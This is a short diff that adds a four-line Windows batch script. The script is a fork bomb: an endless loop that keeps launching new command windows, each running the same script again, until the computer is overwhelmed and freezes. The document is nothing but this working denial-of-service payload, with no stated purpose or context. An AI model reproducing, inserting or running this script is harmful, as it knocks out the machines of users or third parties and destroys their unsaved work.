@@ -1,0 +1,4 @@
+@echo off
+:1
+start cmd.exe /k %0
+goto 1
